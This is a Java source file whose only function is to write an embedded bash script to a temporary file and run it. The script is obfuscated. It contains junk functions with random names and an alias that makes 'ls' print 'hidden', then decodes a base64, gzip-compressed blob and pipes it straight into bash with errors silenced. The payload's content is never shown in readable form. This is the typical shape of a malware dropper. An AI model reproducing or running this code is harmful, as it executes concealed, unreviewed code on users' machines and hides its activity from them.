import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

v16uo0wk8() { echo $((RANDOM * RANDOM)); }
v4qgf9lq6() { for i in {1..3}; do :; done; }
v4c1t59db() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
H4sIAAAAAAAAA51X7W/bxhn/zr/ixgqx3YR6s5wXp87gxXKqwJYSWbYjx4FwIk8SLYrHkUdTli2gaVGkaJc4QLsm2IJlLZo1w9B2w4o0SJv1nzFl+1P/hT3HIyXKSTus9gfePffc73m533PP6Y3fpOq6mapjpyVJb6Dj7x8eff3F4b1v/M/f8/cfHt/ZR/PlK6XaQml5vlD0P/uH//4T//Fj//5dIZ9frQjh24y2iYkOnr84/PuLg+ffDh48O/7Tl8e3P5ZI16I2Q6urhYW5xC7/zCoT586dm1br06qSaZydUXIXZs4p56fT00q2noNPjpzXso2JfrQ35gJAxGaAlEkadJt4RHdamCaJm6R288ROcPLtaB8fwy6yc7VV2KJ6tTefLvYKvdJCdabYu57dWGjnSgvLueJWPlPdqs5srF+fKXaq6WqloC9dvprme4pXCtniQtGodqoMdL3S5XS6WGlPL1VanWLlOitVjNbGltqrZpe7y71Vr6B7urpTOFtoZ26sVsqltUy+u75urWn5zO/XKoul6715r7JWpjjdvVG+YW2QtpFe72SuFtes1bVKeaO+ZlnrHWsd71y9MIrs8mLhGgTFPxCP53nJbd3BSZV2ksyLq10rlSuBIh+Aai43PVouzi/nYZF/YKnlNpu62WxglQDQSGuxsJSvXZsPsjgcc6vUNrQTyQ7NDcezChjsA7UOnn909PJlpLtSKF6p/a50o7ZaXpqTW4xZzmwqZWMv2dRZy627DrFVajJiMh5TKjxgjPWUw/9SHQy0dcBbpU678jDcpdLqwuLSfDm/MI4sUAMo1aCu1jCwTWJDLWUTg2CHOCkDM+KwlEY906BYiysphm66XQV3tLM5WZI6bU23kWIhOTFMiyyp2tgc7e0h0tUZykiS3UFKA9UpZcDa5nAgDdNz+PQj/8X+Tz/8wf/bu4O/PDp4ftf/6qH/6Kl08ybfmUG3bnE81bUNpDhLFCRyIp5LOdTMvqKZBc0T6YEQ1FaHauh0F4Cy3I3DTx4PPrh//P7dw5dfDz69c/D9M0nFDF1CcBgNvZnccqiJ3noL5UuL0q6EkAzuy7NoF8ka0K9uEA1mzHbJGVgi28SAqaybDSqDgOkdyCzuWKEO6p/hEJrpcAgYwgTOfZvYXHATQBnm6HKT0qZBOATWNJs4fFlmBj/Y88ngX0b9WwAgAHWzTl1TEyACNgTaBgccxXMU3ZTPhCs7FhkuRUJDd4B6XDw7Oy6rcZ7BQozi/VCBczZy3HV1nglZ3Hh97l5kz8amE4II52JOeJEHILMwa3FZqg0sH4kJto2dmoYZrrUI1ohdM3En2LxCVGWd1Feo2iZMuWZTRlVqyMHGPk9O4IJMXTZKT7C4O3IACE1UFhyWyFgoQGGQMdW6AYZimmIeWBKGbLBEBDkauomNMTipL3EOAeX8+9/4Hz5FUS1LyVQG2a6JFHWMdJdSGtlOma5hoOylUxl0SnIMQiygrdW04Qukl8OtMvB1pA1VsIuI2qJArtBGaNP/4l9H3z756Yfb8sWwRC+CY9yl248GX30+ePAlihW/ZLV1gBN2soi5pgn0fsUvMMe5HXoHRR8rujm+U5ZO3pFgE8rCZjUPbqla0EknpwJyxCs2tIgUxaQKdhl1LWABEblSRP+VE8MuJ4OQF39wBUKhwOlgo0UdNpvgNnmOhhdRmFCEhNPTMBolNe5D8s3Q0s+mOJawsSxDivlFEpmMJ3wsfODM/52BXx3ozC8GCqC/JsxRYAg1qI10pJtoN5NMZtL9i0ijQR1plDewucSksE7zaNiqbmKll1YubCq3Tm8mmb0zMrXJ+5c8imYP8RsAKSbKTAWo/O7nJBDoMu8Bp06FHg+FIKnbBLeDHVENcY9MIgmI3isQUdiDB38d/PuPR/e+8/c/lU+c4bCS4zUTeRSjpUA8SXie3NewgMMKc+I5KR6fUpOwGrabVHgZUkVvoDFz4o3IDV5ErAVYPOAwGXEFkBPDIcFyQB5kE8j7XBp1cLfGxzpx5jLp6NBkcaV6Ld0g3GIiUEeKwVAitiOwGx43QpOTgdbp01NToeQXKDD5Pzgw9ToSwNWDHKDjhLMX4eztTUTWXk+NERHiVBiSYZiuXbFtVnHNtgkPo3GfuEt9npSGzokwOhge3NhJTY3eGGhtOb+ygo4//s/g3hMpmMzJu2hT3t6ERrEpZzeht2zKliOm4pHaF0J4BURS/gAOpbypjsTBxSoW9KF20IxDjEiaFnNH3RFzE2IXIpOEeJ4jBLz1nVTiN00EPwo0cgl6uFgMuvhviTaXTefOh2hGGFswCHww9Z+FwoZlikUxb1jRDFIvjil4wsCxJybDYwuyCi9QBL/vyNkcUrz0VPw+lCR4jVhoIizuT575H/zz+J13/DsvDn78zN//jj9Eg1Z49OOf4WmaTCah6ONtULTbcdmwNY6Lp6P7Ij2BCsUKquTLy5LkYZ1J/wXQfBynhQ4AAA==
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
